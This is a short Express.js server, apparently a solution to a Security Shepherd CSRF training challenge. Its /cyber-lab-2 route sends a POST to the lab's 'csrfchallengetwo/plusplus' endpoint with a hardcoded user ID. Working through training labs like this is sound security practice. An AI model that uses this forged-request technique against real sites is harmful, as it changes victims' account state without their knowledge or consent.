const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios')

const app = express();

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(cors());

app.get('/', (request, response) => {
    return response.status(200).send('Cyber Blade 2021');
});

app.get('/cyber-lab-2', (request, response) => {

    axios
    .post('http://SecurityShepherd.com/user/csrfchallengetwo/plusplus', {
        userId: '338b543b8b18bb6f2aad43877efccb77e153f77d'
    })
    .then(res => {
    console.log(`statusCode: ${res.statusCode}`)
    console.log(res)
    })
    .catch(error => {
    console.error(error)
    })

    return response.status(200).send('cyber-lab-2');
});

// app.listen(8080, '127.0.0.1', () => {
//     console.log('Starting Cyber Blade...');
// });
app.listen(process.env.PORT||8080, '0.0.0.0', () => {
    console.log('Starting Cyber Blade...');
});